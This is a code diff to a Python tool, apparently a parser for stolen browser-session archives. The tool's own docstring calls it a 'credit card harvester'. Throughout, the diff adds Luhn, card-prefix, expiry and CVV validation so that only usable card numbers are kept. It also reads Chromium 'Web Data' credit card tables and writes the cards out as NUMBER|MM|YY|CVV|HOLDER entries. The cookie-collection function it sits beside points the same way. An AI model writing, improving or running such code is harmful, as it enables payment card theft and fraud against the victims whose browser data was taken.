@@ -374,6 +374,92 @@ def collect_cookies(session_path: Path, output_file: Path) -> Tuple[int, int]:
 
     return file_count, total_lines
 
+def luhn_checksum(num_str: str) -> bool:
+    """Standard Luhn Mod 10 validator."""
+    try:
+        digits = [int(d) for d in num_str]
+        checksum = 0
+        odd = False
+        for d in reversed(digits):
+            if odd:
+                d *= 2
+                if d > 9:
+                    d -= 9
+            checksum += d
+            odd = not odd
+        return checksum % 10 == 0
+    except Exception:
+        return False
+
+def clean_holder_name(raw_name: str) -> str:
+    """Filters out binary hex strings, memory addresses, and non-name junk."""
+    if not raw_name:
+        return ""
+    s = raw_name.strip()
+    # Reject strings with memory/hex dump patterns like "00 00", "AE A2", "F7 7F"
+    if re.search(r"\b[0-9A-Fa-f]{2}\s+[0-9A-Fa-f]{2}\b", s):
+        return ""
+    if any(k in s.lower() for k in ["card", "credit", "expire", "cvv", "master", "visa", "http", "null", "none", "true", "false"]):
+        return ""
+    # Must look like a real name (Latin or Cyrillic characters)
+    if re.match(r"^[A-Za-z\u0400-\u04FF\s.'-]{2,35}$", s):
+        if re.search(r"[A-Za-z\u0400-\u04FF]{2,}", s):
+            return s
+    return ""
+
+def normalize_card_entry(raw_num: str, mm: str, yy: str, cvv: str = "", name: str = "", is_dedicated_card_file: bool = False) -> Optional[str]:
+    """
+    Sanitizes and strictly validates real credit cards:
+    - Must start with valid IIN (2, 3, 4, 5, 6)
+    - Length 13 to 19 digits
+    - Valid expiration year (22 to 38)
+    - Must pass Luhn Mod 10 check (or come from an explicit card file)
+    - Strips hex junk from holder name
+    """
+    clean_num = re.sub(r"[\s-]", "", raw_num)
+    if not (13 <= len(clean_num) <= 19) or not clean_num.isdigit():
+        return None
+
+    # First digit must be a valid card brand prefix (Visa, MC, Amex, Discover, Mir)
+    if clean_num[0] not in "23456":
+        return None
+
+    # Must have digit variety (rejects 00000000, 11111111, etc.)
+    if len(set(clean_num)) < 4:
+        return None
+
+    # Validate month (01 to 12)
+    clean_mm = mm.strip().lstrip("0")
+    if not clean_mm.isdigit():
+        return None
+    m_int = int(clean_mm)
+    if not (1 <= m_int <= 12):
+        return None
+    month_str = str(m_int).zfill(2)
+
+    # Validate year (active/recent cards: 22 to 38)
+    clean_yy = yy.strip()
+    if not clean_yy.isdigit():
+        return None
+    y_int = int(clean_yy)
+    if len(clean_yy) == 4:
+        y_int = y_int % 100
+    if not (22 <= y_int <= 38):
+        return None
+    year_str = str(y_int).zfill(2)
+
+    # Luhn Mod 10 check
+    passes_luhn = luhn_checksum(clean_num)
+    if not passes_luhn and not is_dedicated_card_file:
+        return None
+
+    clean_cvv = cvv.strip()
+    if clean_cvv and not (clean_cvv.isdigit() and len(clean_cvv) in (3, 4)):
+        clean_cvv = ""
+
+    clean_name = clean_holder_name(name)
+    return f"{clean_num}|{month_str}|{year_str}|{clean_cvv}|{clean_name}"
+
 def extract_cards_from_sqlite_db(db_path: Path) -> Set[str]:
     """Queries Chromium Web Data SQLite databases directly for credit cards and autofill."""
     found_cards = set()
@@ -386,13 +472,14 @@ def extract_cards_from_sqlite_db(db_path: Path) -> Set[str]:
             cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
             for row in cursor.fetchall():
                 holder = str(row[0] or "").strip()
-                mm = str(row[1] or "01").zfill(2)
-                yy = str(row[2] or "30")[-2:]
-                # Check if card_number is readable in raw text
+                mm = str(row[1] or "01")
+                yy = str(row[2] or "30")
                 card_data = str(row[3] or "")
                 num_m = re.search(r"\b(\d{13,19})\b", card_data)
                 if num_m:
-                    found_cards.add(f"{num_m.group(1)}|{mm}|{yy}||{holder}")
+                    entry = normalize_card_entry(num_m.group(1), mm, yy, "", holder, is_dedicated_card_file=True)
+                    if entry:
+                        found_cards.add(entry)
         except Exception:
             pass
 
@@ -403,7 +490,9 @@ def extract_cards_from_sqlite_db(db_path: Path) -> Set[str]:
                 val = str(row[1] or "")
                 num_m = re.search(r"\b(\d{13,19})\b", val)
                 if num_m:
-                    found_cards.add(f"{num_m.group(1)}|01|30||")
+                    entry = normalize_card_entry(num_m.group(1), "01", "30", "", "", is_dedicated_card_file=True)
+                    if entry:
+                        found_cards.add(entry)
         except Exception:
             pass
 
@@ -412,36 +501,11 @@ def extract_cards_from_sqlite_db(db_path: Path) -> Set[str]:
         pass
     return found_cards
 
-def normalize_card_entry(raw_num: str, mm: str, yy: str, cvv: str = "", name: str = "") -> Optional[str]:
-    """Sanitizes, validates, and normalizes a card into: NUMBER|MM|YY|CVV|HOLDER."""
-    clean_num = re.sub(r"[\s-]", "", raw_num)
-    if not (13 <= len(clean_num) <= 19) or not clean_num.isdigit():
-        return None
-
-    # Validate month
-    clean_mm = mm.strip().lstrip("0")
-    if not clean_mm.isdigit():
-        return None
-    m_int = int(clean_mm)
-    if not (1 <= m_int <= 12):
-        return None
-    month_str = str(m_int).zfill(2)
-
-    # Validate year
-    clean_yy = yy.strip()
-    if not clean_yy.isdigit():
-        return None
-    year_str = clean_yy[-2:]
-
-    clean_cvv = cvv.strip()
-    clean_name = name.strip()
-    return f"{clean_num}|{month_str}|{year_str}|{clean_cvv}|{clean_name}"
-
 def collect_cards(session_path: Path, output_file: Path) -> Tuple[int, int]:
     """
     Maximal Deep Credit Card Harvester:
     Scans every text, autofill, card, sqlite, and log file across the archive.
-    Extracts all credit cards across all delimiter styles and multiline formats.
+    Extracts all real credit cards across all delimiter styles and multiline formats.
     """
     output_file.parent.mkdir(parents=True, exist_ok=True)
     unique_cards: Set[str] = set()
@@ -478,6 +542,7 @@ def collect_cards(session_path: Path, output_file: Path) -> Tuple[int, int]:
 
             file_path = Path(root) / file
             initial_count = len(unique_cards)
+            is_dedicated = is_card_path(root_l, fl)
 
             # SQLite check
             if fl == "web data" or ext in [".sqlite", ".db"]:
@@ -497,7 +562,8 @@ def collect_cards(session_path: Path, output_file: Path) -> Tuple[int, int]:
                     mm=m.group(2),
                     yy=m.group(3),
                     cvv=m.group(4) or "",
-                    name=m.group(5) or ""
+                    name=m.group(5) or "",
+                    is_dedicated_card_file=is_dedicated
                 )
                 if entry:
                     unique_cards.add(entry)
@@ -509,7 +575,8 @@ def collect_cards(session_path: Path, output_file: Path) -> Tuple[int, int]:
                     mm=m.group(2),
                     yy=m.group(3),
                     cvv=m.group(4) or "",
-                    name=m.group(5) or ""
+                    name=m.group(5) or "",
+                    is_dedicated_card_file=is_dedicated
                 )
                 if entry:
                     unique_cards.add(entry)
@@ -545,7 +612,7 @@ def collect_cards(session_path: Path, output_file: Path) -> Tuple[int, int]:
                                 if ey:
                                     c_yy = ey.group(1)
 
-                        entry = normalize_card_entry(raw_cnum, c_mm, c_yy, c_cvv, c_name)
+                        entry = normalize_card_entry(raw_cnum, c_mm, c_yy, c_cvv, c_name, is_dedicated_card_file=is_dedicated)
                         if entry:
                             unique_cards.add(entry)
 
